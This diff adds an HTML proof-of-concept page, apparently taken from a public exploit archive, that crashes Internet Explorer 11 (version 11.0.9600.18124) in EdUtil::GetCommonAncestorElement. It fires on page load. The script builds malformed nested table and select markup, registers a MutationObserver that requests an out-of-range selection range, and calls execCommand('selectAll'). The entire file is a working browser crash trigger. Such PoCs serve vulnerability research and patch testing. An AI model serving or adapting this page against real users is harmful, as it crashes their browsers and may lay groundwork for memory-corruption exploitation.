@@ -1,0 +1,35 @@
+<!doctype html>
+<html>
+	<head>
+		<meta http-equiv='Cache-Control' content='no-cache'/>
+		<title>EdUtil::GetCommonAncestorElement Remote Crash</title>
+		<script>
+      /*
+      * Title : IE11 EdUtil::GetCommonAncestorElement Remote Crash
+      * Date : 31.12.2015
+      * Author : Marcin Ressel (https://twitter.com/m_ressel)
+      * Vendor Hompage : www.microsoft.com
+      * Software Link : n/a
+      * Version : 11.0.9600.18124
+      * Tested on: Windows 7 x64
+      */
+         		
+      var trg,src,arg;
+      var range,select,observer;
+			function testcase()
+			{
+			  document.body.innerHTML ='<table><colgroup></colgroup><table><tbody><table><table></table><col></col></table></tbody></table></table><select><option>0]. option</option><option>1]. option</option></select><ul type="circle"><li>0]. li</li><li>1]. li</li><li>2]. li</li><li>3]. li</li></ul><select><option>0]. option</option><option>1]. option</option><option>2]. option</option><option>3]. option</option><option>4]. option</option><option>5]. option</option><option>6]. option</option><option>7]. option</option></select>';
+		    var all = document.getElementsByTagName("*"); 
+			  trg = all[9];
+			  src = all[2]; 
+				arg = all[12];
+	      select = document.getSelection(); 
+			  observer = new MutationObserver(new Function("","range = select.getRangeAt(258);")); 
+				select.selectAllChildren(document);
+			  document.execCommand("selectAll",false,'<ul type="square"><li>0]. li</li><li>1]. li</li><li>2]. li</li><li>3]. li</li><li>4]. li</li><li>5]. li</li><li>6]. li</li></ul><select><option>0]. option</option><option>1]. option</option><option>2]. option</option><option>3]. option</option><option>4]. option</option><option>5]. option</option><option>6]. option</option><option>7]. option</option></select>');	
+			}
+		</script>
+	</head>
+	<body onload='testcase();'>	
+	</body>
+</html>
